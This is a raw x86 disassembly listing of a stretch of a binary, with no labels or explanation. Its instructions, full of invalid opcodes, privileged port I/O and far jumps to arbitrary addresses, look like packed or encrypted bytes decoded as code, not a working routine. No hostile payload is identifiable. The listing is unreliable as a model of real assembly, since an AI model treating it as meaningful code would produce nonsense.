  414588:	outs   dx,BYTE PTR ds:[esi]
  414589:	xchg   ebp,eax
  41458a:	hlt    
  41458b:	sbb    dl,BYTE PTR [ebx-0x1]
  41458e:	call   0xaf89:0x4425ebc8
  414595:	push   es
  414596:	push   0x2cbbcb6b
  41459b:	std    
  41459c:	push   edx
  41459d:	in     eax,0x79
  41459f:	dec    esi
  4145a0:	or     eax,0xa14c4b53
  4145a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145a6:	fimul  WORD PTR [esi+0x62d9fb5a]
  4145ac:	mov    eax,ds:0xe7f41442
  4145b1:	cmp    DWORD PTR [esi-0x65],esi
  4145b4:	imul   esp,DWORD PTR [edi],0x2
  4145b7:	rcr    esp,1
  4145b9:	clc    
  4145ba:	mov    dl,0x67
  4145bc:	jb     0x4145db
  4145be:	mov    dl,0x3e
  4145c0:	arpl   WORD PTR [eax-0x63569c80],cx
  4145c6:	push   edi
  4145c7:	jns    0x414611
  4145c9:	pop    edi
  4145ca:	movsx  ecx,ah
  4145cd:	mov    ah,BYTE PTR ds:0x89756a08
  4145d3:	clc    
  4145d4:	into   
  4145d5:	jnp    0x41464b
  4145d7:	xor    BYTE PTR [edi+0x2d],dh
  4145da:	or     BYTE PTR [ecx+esi*8-0x33],dh
  4145de:	mov    eax,0x8d2b4f24
  4145e3:	enter  0xe6a4,0x28
  4145e7:	sub    al,0x9d
  4145e9:	jge    0x41456c
  4145eb:	sbb    BYTE PTR [ebx+0x4e1b7675],cl
  4145f1:	ins    DWORD PTR es:[edi],dx
  4145f2:	dec    edx
  4145f3:	call   0xac6e:0xf2d2e595
  4145fa:	xchg   edi,eax
  4145fb:	(bad)  
  4145fc:	(bad)  
  4145fd:	popw   es
  4145ff:	inc    esi
  414600:	(bad)
  414604:	mov    bh,0x44
  414606:	(bad)  
  414607:	imul   eax,DWORD PTR [esp+edi*8],0x92114566
  41460e:	rol    BYTE PTR [ebp+ebx*4+0x71490bf3],0x5c
  414616:	int    0xfb
  414618:	cmc    
  414619:	cmc    
  41461a:	loope  0x4145ec
  41461c:	xor    bh,BYTE PTR [ebx-0x47809909]
  414622:	in     eax,0x1a
  414624:	push   ecx
  414625:	adc    BYTE PTR [esi-0x12],0xce
  414629:	mov    ds:0x4db5d4e,eax
  41462e:	add    BYTE PTR [ecx-0x569e1738],bl
  414634:	test   DWORD PTR [edx],edi
  414636:	mov    eax,ds:0x982afeae
  41463b:	or     al,0xab
  41463d:	mov    edx,0x62d263ad
  414642:	sbb    al,0xb0
  414644:	cwde   
  414645:	cmc    
  414646:	shr    cl,cl
  414648:	push   edi
  414649:	mov    gs,WORD PTR [esp+edi*1-0x60]
  41464d:	xor    edi,0xffffff96
  414650:	fcomp  DWORD PTR [ecx+eiz*1+0x0]
  414654:	imul   edx,DWORD PTR [edi],0x7b8cf623
  41465a:	xchg   ecx,eax
  41465b:	(bad)  
  41465c:	out    dx,eax
  41465d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41465e:	sbb    ah,BYTE PTR [esi-0x328782d2]
  414664:	mov    al,0x24
  414666:	and    ebp,DWORD PTR [ebp+0x560ee31f]
  41466c:	cmp    al,0xf5
  41466e:	sbb    DWORD PTR [ebx+0x4c],ebx
  414671:	and    bl,al
  414673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414674:	das    
  414675:	pop    edx
  414676:	xchg   esp,eax
  414677:	xor    eax,ebp
  414679:	add    al,0x4c
  41467b:	add    DWORD PTR [esi-0x401f05b5],ecx
  414681:	js     0x4146b9
  414683:	js     0x414667
  414685:	mov    al,ds:0x74f9d0ac
  41468a:	pop    ebx
  41468b:	sub    al,0xeb
  41468d:	and    DWORD PTR ds:0x56effa07,edi
  414693:	cmp    dh,BYTE PTR [edx]
  414695:	dec    esi
  414696:	and    edi,DWORD PTR [eax+0x48773997]
  41469c:	dec    esi
  41469d:	adc    ebx,DWORD PTR [ecx-0x80]
  4146a0:	loop   0x414685
  4146a2:	mov    edx,DWORD PTR [edx+0x47a8ab4]
  4146a8:	jbe    0x4146e1
  4146aa:	out    dx,eax
  4146ab:	jle    0x4146ff
  4146ad:	scas   eax,DWORD PTR es:[edi]
  4146ae:	cmp    bx,ax
  4146b1:	loope  0x4146e9
  4146b3:	inc    eax
  4146b4:	loope  0x414643
  4146b6:	iret   
  4146b7:	test   eax,0xcb742d31
  4146bc:	imul   DWORD PTR [esi]
  4146be:	iret   
  4146bf:	mov    WORD PTR [esi-0x73],?
  4146c2:	outs   dx,BYTE PTR ds:[esi]
  4146c3:	mov    edx,0x8e6a2db
  4146c8:	sub    BYTE PTR [ebp-0x4492a021],0x1
  4146cf:	in     eax,dx
  4146d0:	fs ror esp,0x81
  4146d4:	xlat   BYTE PTR ds:[ebx]
  4146d5:	int    0xe0
  4146d7:	rol    ch,cl
  4146d9:	cli    
  4146da:	adc    al,0x9f
  4146dc:	jge    0x414715
  4146de:	int3   
  4146df:	ds dec edx
  4146e1:	loopne 0x414710
  4146e3:	les    edx,FWORD PTR [edi]
  4146e5:	push   ds
  4146e6:	mov    ebp,0x1271a1d9
  4146eb:	cmc    
  4146ec:	aam    0xf8
  4146ee:	adc    BYTE PTR [esi],bh
  4146f0:	clc    
  4146f1:	mov    esp,0xc5cc4679
  4146f6:	jno    0x41473a
  4146f8:	pop    edx
  4146f9:	jecxz  0x414683
  4146fb:	jnp    0x41473a
  4146fd:	mov    ch,0x87
  4146ff:	(bad)  
  414700:	retf   
  414701:	pop    ss
  414702:	fstp   DWORD PTR [ecx+edi*8-0x7]
  414706:	push   ecx
  414707:	add    BYTE PTR [esi+0x4d],dl
  41470a:	mov    esp,0x843439e
  41470f:	or     edi,DWORD PTR [ebx]
  414711:	mov    ds,WORD PTR [edx]
  414713:	inc    esi
  414714:	ins    BYTE PTR es:[edi],dx
  414715:	pop    edi
  414716:	rcl    al,0xb4
  414719:	mov    ds:0x8a0a5cfd,eax
  41471e:	cmp    al,0x81
  414720:	(bad)  
  414721:	mov    edx,0x9911a285
  414726:	mov    ecx,ebx
  414728:	pop    esi
  414729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41472a:	push   esp
  41472b:	xlat   BYTE PTR ds:[ebx]
  41472c:	cmp    eax,DWORD PTR [esi-0x61]
  41472f:	into   
  414730:	jne    0x414719
  414732:	loope  0x414771
  414734:	hlt    
  414735:	jo     0x4146e6
  414737:	les    ebp,FWORD PTR [ecx]
  414739:	out    0x29,eax
  41473b:	mov    bh,0x7c
  41473d:	adc    dh,bh
  41473f:	stos   DWORD PTR es:[edi],eax
  414740:	add    al,BYTE PTR [ebp+0x20]
  414743:	and    eax,0x6c2486b3
  414748:	push   edi
  414749:	push   ds
  41474a:	xchg   esi,eax
  41474b:	cld    
  41474c:	pop    esp
  41474d:	xor    bl,ah
  41474f:	add    BYTE PTR [edx],al
  414751:	ret    0x837f
  414754:	int3   
  414755:	sar    DWORD PTR [ebp-0x55],1
  414758:	sbb    eax,0x1329f865
  41475d:	rol    BYTE PTR [edx],1
  41475f:	lds    esi,FWORD PTR [edx+0x2adec6d1]
  414765:	fbld   TBYTE PTR ss:[ecx-0x16fa7cb5]
  41476c:	push   edx
  41476d:	stos   BYTE PTR es:[edi],al
  41476e:	test   BYTE PTR [edx],0x4a
  414771:	push   0x3c102a42
  414776:	add    DWORD PTR [esi+0x63],edx
  414779:	cs rol BYTE PTR fs:[eax+0x594c56e3],cl
  414781:	inc    esp
  414782:	and    DWORD PTR [ecx-0x30],ebx
  414785:	push   ss
  414786:	inc    edi
  414787:	adc    DWORD PTR [edi],0x3cf2fb
  41478d:	fsubr  QWORD PTR [ecx]
  41478f:	pop    ebx
  414790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414791:	add    DWORD PTR [esi-0x288c92ba],eax
  414797:	jmp    0x41475c
  414799:	cmp    BYTE PTR [edi+eax*4+0x10de36c1],dl
  4147a0:	scas   al,BYTE PTR es:[edi]
  4147a1:	cmp    al,0x88
  4147a3:	stc    
  4147a4:	shl    BYTE PTR [ebp+ebp*1+0x72],1
  4147a8:	pop    edi
  4147a9:	cmp    bl,bh
  4147ab:	idiv   ch
  4147ad:	push   esp
  4147ae:	cli    
  4147af:	push   edi
  4147b0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b2:	jecxz  0x414776
  4147b4:	add    al,0x61
  4147b6:	stos   BYTE PTR es:[edi],al
  4147b7:	cmp    al,0xc8
  4147b9:	add    DWORD PTR [edi+eiz*1-0x4ff9087c],edx
  4147c0:	test   al,0x65
  4147c2:	mov    DWORD PTR [edx+0x748ac345],0x39999bca
  4147cc:	mov    al,0x68
  4147ce:	jns    0x4147be
  4147d0:	pop    ebp
  4147d1:	sbb    al,0x34
  4147d3:	fild   DWORD PTR [edi+0x36]
  4147d6:	cld    
  4147d7:	sub    ebp,DWORD PTR [edx+0x6db03d02]
  4147dd:	mov    BYTE PTR [esp+edi*8],dh
  4147e0:	(bad)  
  4147e2:	add    DWORD PTR [ebx-0x5b],ebx
  4147e5:	ins    DWORD PTR es:[edi],dx
  4147e6:	popa   
  4147e7:	ret    
  4147e8:	dec    ebp
  4147e9:	cmp    ch,BYTE PTR ss:[ebp+0x2f]
  4147ed:	pop    ds
  4147ee:	in     al,dx
  4147ef:	mov    ds:0xc73a73e7,al
  4147f4:	push   esp
  4147f5:	add    BYTE PTR [ecx],0xf9
  4147f8:	les    esp,FWORD PTR [esi+0x26c29887]
  4147fe:	xchg   edx,eax
  4147ff:	pop    edi
  414800:	cli    
  414801:	mov    ah,0x43
  414803:	jecxz  0x4147f9
  414805:	xchg   esi,eax
  414806:	test   eax,0xa4949757
  41480b:	pop    es
  41480c:	repz std 
  41480e:	push   edi
  41480f:	fbld   TBYTE PTR [ebx]
  414811:	and    BYTE PTR [edi],al
  414813:	hlt    
  414814:	mov    ah,0x18
  414816:	add    BYTE PTR [eax+0x2dccbc9f],ch
  41481c:	in     eax,dx
  41481d:	fwait
  41481e:	lods   eax,DWORD PTR ds:[esi]
  41481f:	inc    esi
  414820:	cmp    BYTE PTR [ebx],bl
  414822:	push   0x9015704f
  414827:	aam    0x7a
  414829:	mov    es:0x72594b42,al
  41482f:	enter  0xd595,0xa4
  414833:	ret    0x851d
  414836:	jbe    0x41481e
  414838:	lods   eax,DWORD PTR ds:[esi]
  414839:	sbb    edi,ebx
  41483b:	pop    ecx
  41483c:	outs   dx,DWORD PTR ds:[esi]
  41483d:	jmp    0x414849
  41483f:	push   0x2ab0fb7f
  414844:	inc    eax
  414845:	imul   ecx,DWORD PTR [ebx+0x6d],0xb89201f0
  41484c:	mov    ah,0xb7
  41484e:	mov    ah,0x68
  414850:	push   cs
  414851:	mov    ecx,cs
  414853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414854:	adc    BYTE PTR [edi+0x42],dh
  414857:	std    
  414858:	mov    edx,0xd1bcd26f
  41485d:	sub    ebx,eax
  41485f:	sub    eax,0x45f22b30
  414864:	and    eax,0x91bacfc3
  414869:	pop    ebx
  41486a:	jmp    0x426fde61
  41486f:	inc    esi
  414870:	and    DWORD PTR [ecx+0x3ef957fe],ebp
  414876:	and    ecx,esp
  414878:	pinsrw mm3,WORD PTR [ebp+0x41341c09],0x4
  414880:	mov    ch,0x23
  414882:	aam    0xe2
  414884:	pop    edi
  414885:	xchg   ebp,eax
  414886:	mov    dl,0x23
  414888:	sbb    eax,0x9e99c460
  41488d:	xchg   ebx,eax
  41488e:	popa   
  41488f:	stc    
  414890:	lea    esi,[esi+0x25408753]
  414896:	push   esi
  414897:	mov    esi,DWORD PTR ds:0x6f6f4fdb
  41489d:	or     al,0x30
  41489f:	pushf  
  4148a0:	out    dx,eax
  4148a1:	xor    al,0x3b
  4148a3:	dec    eax
  4148a4:	dec    esp
  4148a5:	lds    ebp,FWORD PTR [ecx-0x418f3fc9]
  4148ab:	sub    eax,0x619e9858
  4148b0:	mov    esi,0x16e3565a
  4148b5:	data16 xlat BYTE PTR ds:[ebx]
  4148b7:	arpl   WORD PTR [ebp-0x5fee6292],sp
  4148bd:	inc    edi
  4148be:	jmp    0x2e62:0x23fc9a9e
  4148c5:	data16 ja 0x4148ca
  4148c8:	pop    eax
  4148c9:	test   al,0x53
  4148cb:	mov    ebp,0xbe268299
  4148d0:	into   
  4148d1:	mov    ch,0x15
  4148d3:	pop    ds
  4148d4:	pop    ecx
  4148d5:	jmp    0xe7376fe0
  4148da:	test   al,0x7c
  4148dc:	mov    BYTE PTR [edi-0x13],dh
  4148df:	fs loopne 0x414959
  4148e2:	mov    ?,WORD PTR ds:0x2c3cc267
  4148e8:	push   esp
  4148e9:	mov    ebp,DWORD PTR [ebp+0x37]
  4148ec:	loop   0x4148e1
  4148ee:	icebp  
  4148ef:	das    
  4148f0:	imul   edi,esi,0xaf708911
  4148f6:	add    ebp,ebp
  4148f8:	leave  
  4148f9:	xor    al,0x4
  4148fb:	sub    al,0xbe
  4148fd:	ds jecxz 0x414940
  414900:	je     0x41491d
  414902:	mov    esp,0x59a90354
  414907:	clc    
  414908:	int    0x6
  41490a:	cwde   
  41490b:	sub    DWORD PTR [edx-0x7c],esp
  41490e:	scas   eax,DWORD PTR es:[edi]
  41490f:	iret   
  414910:	xor    al,BYTE PTR [eax+0x6f]
  414913:	sbb    DWORD PTR [edx-0x3b73918f],ebx
  414919:	or     DWORD PTR [esi-0x3d],ecx
  41491c:	cld    
  41491d:	add    al,0x4a
  41491f:	pusha  
  414920:	mov    ebx,0xc3f59241
  414925:	sbb    al,0xeb
  414927:	add    eax,0xf2164d99
  41492c:	cwde   
  41492d:	xor    BYTE PTR [eax],bl
  41492f:	(bad)  
  414930:	dec    edx
  414931:	faddp  st(1),st
  414933:	rcl    bl,0x24
  414936:	nop
  414937:	iret   
  414938:	call   0x7b56:0xa3fa6043
  41493f:	cmp    cl,BYTE PTR [edi]
  414941:	dec    ebx
  414942:	mul    BYTE PTR [eax]
  414944:	mov    edx,0x305c71a5
  414949:	mov    WORD PTR [esi],ds
  41494b:	sub    ch,bh
  41494d:	jo     0x414955
  41494f:	inc    ebp
  414950:	mov    eax,ds:0x98b0842e
  414955:	arpl   WORD PTR [edi+0x1d],di
  414958:	pop    ss
  414959:	addr16 jo 0x4149c7
  41495c:	ret    0x30c3
  41495f:	jmp    0x4148e8
  414961:	and    DWORD PTR [ebp-0x11ef360f],ecx
  414967:	mov    cl,dh
  414969:	xchg   edi,eax
  41496a:	out    0xf3,eax
  41496c:	fs push ds
  41496e:	ret    
  41496f:	jnp    0x4149c9
  414971:	shr    DWORD PTR [edx],cl
  414973:	pop    edx
  414974:	or     al,0x34
  414976:	sub    ebx,esi
  414978:	jmp    0x414984
  41497a:	pushf  
  41497b:	mov    ah,0x4a
  41497d:	pop    ds
  41497e:	jne    0x414953
  414980:	add    eax,DWORD PTR [esi-0x62]
  414983:	call   0x4339:0x7f26ae24
  41498a:	push   eax
  41498b:	fbld   TBYTE PTR [eax+0x5c]
  41498e:	cmp    edx,ebp
  414990:	pushf  
  414991:	push   es
  414992:	xor    eax,0xf42f018c
  414997:	test   esp,esi
  414999:	je     0x414a02
  41499b:	dec    esp
  41499c:	les    ecx,FWORD PTR [ebx]
  41499e:	pop    edx
  41499f:	jle    0x414987
  4149a1:	adc    eax,0x25067c18
  4149a6:	retf   0x28fe
  4149a9:	outs   dx,DWORD PTR ds:[esi]
  4149aa:	in     eax,0xf3
  4149ac:	bound  ebx,QWORD PTR [esi+0x30721fd]
  4149b2:	mov    ebp,0xc01f0fdc
  4149b7:	dec    eax
  4149b8:	ds leave 
  4149ba:	test   DWORD PTR [edi],edx
  4149bc:	shr    BYTE PTR [eax+eax*4-0x58],0x1a
  4149c1:	ins    DWORD PTR es:[edi],dx
  4149c2:	mov    esp,0xf73f4a58
  4149c7:	scas   eax,DWORD PTR es:[edi]
  4149c8:	cmp    BYTE PTR [ebp+0x9f0f1f9],ah
  4149ce:	jmp    0xbdc4cad0
  4149d3:	iret   
  4149d4:	scas   eax,DWORD PTR es:[edi]
  4149d5:	cmp    ecx,DWORD PTR [edi+0x52]
  4149d8:	daa    
  4149d9:	loop   0x414998
  4149db:	pop    edi
  4149dc:	lods   eax,DWORD PTR ds:[esi]
  4149dd:	sbb    DWORD PTR [esi],esp
  4149df:	popf   
  4149e0:	dec    edx
  4149e1:	bound  esi,QWORD PTR [ebx-0x6b]
  4149e4:	repnz xchg ebp,eax
  4149e6:	cmp    esi,DWORD PTR [edx-0x3]
  4149e9:	test   DWORD PTR [ebp+eiz*8+0x536e001d],ebx
  4149f0:	pop    ebp
  4149f1:	jmp    0x124b:0x27c79ab8
  4149f8:	push   esp
  4149f9:	fucomi st,st(1)
  4149fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149fc:	pop    ds
  4149fd:	out    0x1d,al
  4149ff:	dec    esp
  414a00:	push   edx
  414a01:	fld    DWORD PTR [esi-0x45e88ad5]
  414a07:	push   ds
  414a08:	dec    eax
  414a09:	addr16 rcr dl,0x12
  414a0d:	inc    esi
  414a0e:	rol    BYTE PTR [edx],0x2f
  414a11:	popa   
  414a12:	mov    WORD PTR [edx],fs
  414a14:	and    BYTE PTR [ecx+0x33],ah
  414a17:	call   0xe3adbd9a
  414a1c:	fs ret 
  414a1e:	dec    edx
  414a1f:	xchg   esp,eax
  414a20:	cld    
  414a21:	pop    esi
  414a22:	in     al,dx
  414a23:	xchg   ebp,eax
  414a24:	loop   0x4149e0
  414a26:	pop    ss
  414a27:	mov    esi,0x3e3fc0cc
  414a2c:	fs mov dh,0xca
  414a2f:	mov    dl,0x7c
  414a31:	mov    eax,ds:0x588ab4b4
  414a36:	pop    edi
  414a37:	stos   DWORD PTR es:[edi],eax
  414a38:	mov    ds:0xfbf1fa08,eax
  414a3d:	clc    
  414a3e:	mov    edx,0xeed2a024
  414a43:	cdq    
  414a44:	(bad)  
  414a45:	aad    0x9e
  414a47:	pusha  
  414a48:	scas   al,BYTE PTR es:[edi]
  414a49:	push   es
  414a4a:	push   cs
  414a4b:	into   
  414a4c:	in     al,dx
  414a4d:	sbb    cl,BYTE PTR ds:0x16c04ded
  414a53:	xchg   BYTE PTR ds:0x284efb7d,cl
  414a59:	xor    dh,BYTE PTR [ebx]
  414a5b:	or     BYTE PTR [ecx],ah
  414a5d:	daa    
  414a5e:	ret    
  414a5f:	repnz cmp al,ah
  414a62:	sub    al,0x2a
  414a64:	xchg   ebp,eax
  414a65:	mov    esp,0xf4efd6a
  414a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a6b:	or     DWORD PTR [edx],edi
  414a6d:	fiadd  DWORD PTR [edi-0x54]
  414a70:	iret   
  414a71:	jne    0x414ab7
  414a73:	imul   ecx,esp,0xc84a4591
  414a79:	sub    al,0xb7
  414a7b:	jl     0x414a74
  414a7d:	push   0x73
  414a7f:	retf   0x623f
  414a82:	js     0x414acc
  414a84:	mov    ebp,0xba6c1e92
  414a89:	push   0x8b0449d2
  414a8e:	mov    ds:0x89157487,al
  414a93:	jl     0x414a75
  414a95:	xchg   BYTE PTR [edi+0x46],dl
  414a98:	xchg   esp,eax
  414a99:	aaa    
  414a9a:	and    DWORD PTR [eax-0x5140b640],0xffffffe3
  414aa1:	std    
  414aa2:	sbb    al,0xa0
  414aa4:	sub    eax,0xd76a73bf
  414aa9:	imul   ecx,DWORD PTR [ebx],0xffffffbc
  414aac:	and    ah,BYTE PTR [eax]
  414aae:	lahf   
  414aaf:	mov    eax,ds:0x7e8856ea
  414ab4:	pop    eax
  414ab5:	mov    ss,WORD PTR [esi-0x57e2e349]
  414abb:	adc    DWORD PTR [edx-0x6b388d75],ecx
  414ac1:	xchg   ebx,eax
  414ac2:	lods   al,BYTE PTR ds:[esi]
  414ac3:	pop    eax
  414ac4:	and    DWORD PTR [eax],esp
  414ac6:	dec    edi
  414ac7:	xchg   edx,eax
  414ac8:	retf   0x56ac
  414acb:	test   eax,0x2821a2d0
  414ad0:	jg     0x414aef
  414ad2:	ret    0xd387
  414ad5:	cmp    esp,DWORD PTR [eax-0x11]
  414ad8:	imul   edx,ecx,0xb0d714cb
  414ade:	add    eax,0xf11fa3e0
  414ae3:	shl    eax,0x7c
  414ae6:	out    0x90,eax
  414ae8:	xchg   ebx,eax
  414ae9:	aam    0x3b
  414aeb:	mov    ebp,0x19b95ea4
  414af0:	fiadd  WORD PTR [ecx+0xd]
  414af3:	scas   eax,DWORD PTR es:[edi]
  414af4:	jae    0x414b1a
  414af6:	push   ecx
  414af7:	popa   
  414af8:	jo     0x414a9e
  414afa:	clc    
  414afb:	fadd   QWORD PTR [edi-0x7bccfb52]
  414b01:	das    
  414b02:	std    
  414b03:	pop    ebp
  414b04:	out    0x5d,al
  414b06:	jmp    0x3c85:0xd1e83875
  414b0d:	xchg   DWORD PTR [ebx],ecx
  414b0f:	cmp    eax,0x5acf4320
  414b14:	xchg   ebx,eax
  414b15:	or     edx,DWORD PTR [edx+0x3b]
  414b18:	ficomp WORD PTR [edi+edx*1+0x65616a85]
  414b1f:	mov    cl,0xa5
  414b21:	ss dec edi
  414b23:	dec    eax
  414b24:	sbb    DWORD PTR [eax-0xa33c0],0xffffffa3
  414b2b:	jle    0x414b8a
  414b2d:	mov    BYTE PTR [ecx-0x3e51c3d4],ah
  414b33:	and    ebp,DWORD PTR [ebx-0x3d5008e7]
  414b39:	cmp    DWORD PTR [eax+ebp*2+0x6],ebp
  414b3d:	shr    BYTE PTR [edi],cl
  414b3f:	sbb    eax,0x987cf1be
  414b44:	repz mov edi,0xbf8b0c56
  414b4a:	test   BYTE PTR [edi+0x19],0x6a
  414b4e:	out    dx,al
  414b4f:	push   edi
  414b50:	or     al,0x5a
  414b52:	push   edi
  414b53:	cwde   
  414b54:	cmp    DWORD PTR [ecx+eiz*2],eax
  414b57:	rcr    BYTE PTR [ecx+esi*1-0x3d],1
  414b5b:	jae    0x414baa
  414b5d:	mov    cl,0xbf
  414b5f:	aad    0x88
  414b61:	imul   ecx,ecx,0xaf33cb40
  414b67:	test   BYTE PTR [edi+0x37],dl
  414b6a:	mov    edx,0xfa884fb3
  414b6f:	cmp    BYTE PTR [esi],dl
  414b71:	scas   al,BYTE PTR es:[edi]
  414b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b73:	adc    edx,esi
  414b75:	pop    ecx
  414b76:	add    eax,0xd993e046
  414b7b:	out    0x14,al
  414b7d:	push   ebp
  414b7e:	and    al,0x43
  414b80:	dec    edx
  414b81:	aad    0xc4
  414b83:	repz and dl,bl
  414b86:	inc    esi
  414b87:	xchg   ecx,eax
  414b88:	iret   
  414b89:	(bad)  
  414b8a:	loop   0x414b18
  414b8c:	scas   al,BYTE PTR es:[edi]
  414b8d:	dec    ecx
  414b8e:	mov    ebx,0x1ed873af
  414b93:	lods   eax,DWORD PTR ds:[esi]
  414b94:	dec    ebx
  414b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b96:	out    dx,al
  414b97:	jmp    0xe4ae:0x3f7f3dfb
  414b9e:	lods   al,BYTE PTR ds:[esi]
  414b9f:	call   0x345e2ae3
  414ba4:	and    eax,0xf96a6a8c
  414ba9:	nop
  414baa:	mov    ds:0xb91890c8,eax
  414baf:	mov    ds:0x8e899e13,eax
  414bb4:	jno    0x414b44
  414bb6:	adc    eax,0x22e9efdc
  414bbb:	shl    DWORD PTR [edi+0x11b8cad1],1
  414bc1:	shl    DWORD PTR [ecx],cl
  414bc3:	mov    ah,0xcf
  414bc5:	adc    DWORD PTR [ebp-0x52],0x7d
  414bc9:	jmp    0xaaeba83e
  414bce:	add    DWORD PTR [esi+edx*8+0x26ab7872],edi
  414bd5:	fstp   QWORD PTR [ebx+esi*2+0x74b11c82]
  414bdc:	xor    DWORD PTR [ecx-0x5],ecx
  414bdf:	jge    0x414bcf
  414be1:	sahf   
  414be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414be3:	sbb    DWORD PTR [eax+0x7b],eax
  414be6:	or     BYTE PTR [ecx+0x7b411a2f],bl
  414bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bed:	mov    ?,WORD PTR ds:0xae79612e
  414bf3:	jno    0x414c44
  414bf5:	outs   dx,DWORD PTR ds:[esi]
  414bf6:	xchg   ebp,eax
  414bf7:	icebp  
  414bf8:	mov    cl,bl
  414bfa:	dec    eax
  414bfb:	out    0x9a,al
  414bfd:	fnstsw WORD PTR [edx]
  414bff:	sahf   
  414c00:	cld    
  414c01:	stc    
  414c02:	(bad)  
  414c03:	mov    cl,0x6
  414c05:	ret    
  414c06:	call   0xda8b7194
  414c0b:	mov    edi,edi
  414c0d:	jne    0x414c44
  414c0f:	ror    BYTE PTR [eax+0xf49d16c],cl
  414c15:	xor    BYTE PTR [ecx+eiz*2],0xea
  414c19:	das    
  414c1a:	ins    BYTE PTR es:[edi],dx
  414c1b:	inc    DWORD PTR [edx-0x7d]
  414c1e:	into   
  414c1f:	pusha  
  414c20:	and    edx,DWORD PTR [ecx-0xd]
  414c23:	outs   dx,BYTE PTR ds:[esi]
  414c24:	xchg   ebp,eax
  414c25:	cmp    eax,DWORD PTR [ebp-0x26]
  414c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c29:	stos   DWORD PTR es:[edi],eax
  414c2a:	xor    ebp,edi
  414c2c:	push   es
  414c2d:	sbb    DWORD PTR [ecx],eax
  414c2f:	popf   
  414c30:	sub    BYTE PTR [edi+0x55b65e24],ch
  414c36:	jae    0x414c50
  414c38:	shl    BYTE PTR [edx+0x11],0x2d
  414c3c:	lahf   
  414c3d:	into   
  414c3e:	ds xchg ecx,eax
  414c40:	cld    
  414c41:	stc    
  414c42:	jbe    0x414c22
  414c44:	mov    esi,0x6146f9c9
  414c49:	outs   dx,DWORD PTR ds:[esi]
  414c4a:	xor    DWORD PTR [eax+0x248a0867],esi
  414c50:	pop    edi
  414c51:	test   al,0x6e
  414c53:	xchg   esi,eax
  414c54:	dec    eax
  414c55:	outs   dx,DWORD PTR ds:[esi]
  414c56:	cmp    BYTE PTR [ebx+0x43],bh
  414c59:	cld    
  414c5a:	xor    DWORD PTR [eax-0x22],esi
  414c5d:	adc    ah,BYTE PTR [ebx-0x23fb85e0]
  414c63:	jge    0x414bee
  414c65:	dec    ebx
  414c66:	xor    al,BYTE PTR [si-0x1f58]
  414c6b:	inc    esi
  414c6c:	sbb    ebx,DWORD PTR [ebp+ebx*8-0x1c1dc2ca]
  414c73:	push   0xfffffffa
  414c75:	stc    
  414c76:	xchg   DWORD PTR [eax],esp
  414c78:	ffreep st(3)
  414c7a:	cld    
  414c7b:	cmp    al,0x43
  414c7d:	or     ebp,edi
  414c7f:	dec    ebp
  414c80:	mov    al,0x1f
  414c82:	mov    bh,BYTE PTR [ecx+eax*1-0x61]
  414c86:	xchg   ecx,eax
  414c87:	xchg   esp,eax
  414c88:	mov    eax,0x4a400741
  414c8d:	sub    edi,esp
  414c8f:	dec    edi
  414c90:	ja     0x414c88
  414c92:	sahf   
  414c93:	pop    esi
  414c94:	jecxz  0x414cd1
  414c96:	mov    eax,ds:0x809f1809
  414c9b:	adc    al,0x2d
  414c9d:	data16 mov ch,0xa9
  414ca0:	shr    bh,cl
  414ca2:	push   eax
  414ca3:	test   eax,0x560d387f
  414ca8:	es add eax,0xd8066635
  414cae:	jne    0x414c80
  414cb0:	inc    ecx
  414cb1:	adc    BYTE PTR [esi-0x4],0x4b
  414cb5:	xor    ch,BYTE PTR [edx]
  414cb7:	loop   0x414c56
  414cb9:	xchg   edx,eax
  414cba:	push   cs
  414cbb:	je     0x414c45
  414cbd:	outs   dx,DWORD PTR ds:[esi]
  414cbe:	jbe    0x414ce9
  414cc0:	inc    edx
  414cc1:	or     DWORD PTR [edi+0x3693365a],esi
  414cc7:	xchg   esp,eax
  414cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc9:	outs   dx,BYTE PTR ds:[esi]
  414cca:	retf   
  414ccb:	or     ebx,DWORD PTR [ecx-0x5c]
  414cce:	xchg   esp,eax
  414ccf:	jge    0x414c76
  414cd1:	and    BYTE PTR [edx],dh
  414cd3:	and    DWORD PTR [ebp+0x5b17ce3f],ebp
  414cd9:	fwait
  414cda:	mov    bh,0xa9
  414cdc:	test   al,0xb9
  414cde:	shl    BYTE PTR [ebp-0x4ac46a1b],1
  414ce4:	jp     0x414c6d
  414ce6:	idiv   DWORD PTR [edx]
  414ce8:	adc    edi,esi
  414cea:	mul    DWORD PTR [edi]
  414cec:	int    0xfd
  414cee:	jns    0x414c88
  414cf0:	shl    BYTE PTR [ebp-0x11],cl
  414cf3:	data16 sub al,0x2e
  414cf6:	add    eax,0x716c8fde
  414cfb:	test   eax,0x9228867c
  414d00:	xchg   DWORD PTR [ecx-0x62ec5c0a],eax
  414d06:	aad    0xfb
  414d08:	test   BYTE PTR [eax],cl
  414d0a:	dec    esp
  414d0b:	cs popa 
  414d0d:	das    
  414d0e:	jne    0x414d3f
  414d10:	mov    ecx,0x7ff39ae7
  414d15:	aaa    
  414d16:	lods   al,BYTE PTR ds:[esi]
  414d17:	jle    0x414d42
  414d19:	fiadd  WORD PTR [esi]
  414d1b:	stos   BYTE PTR es:[edi],al
  414d1c:	mov    BYTE PTR [edx+0x55],ah
  414d1f:	jbe    0x414d49
  414d21:	arpl   WORD PTR [esi-0x29e620e0],cx
  414d27:	jmp    0x414cf5
  414d29:	leave  
  414d2a:	mov    dh,0x8d
  414d2c:	jle    0x414cf7
  414d2e:	inc    ecx
  414d2f:	imul   DWORD PTR [ebp-0x484f0dcf]
  414d35:	std    
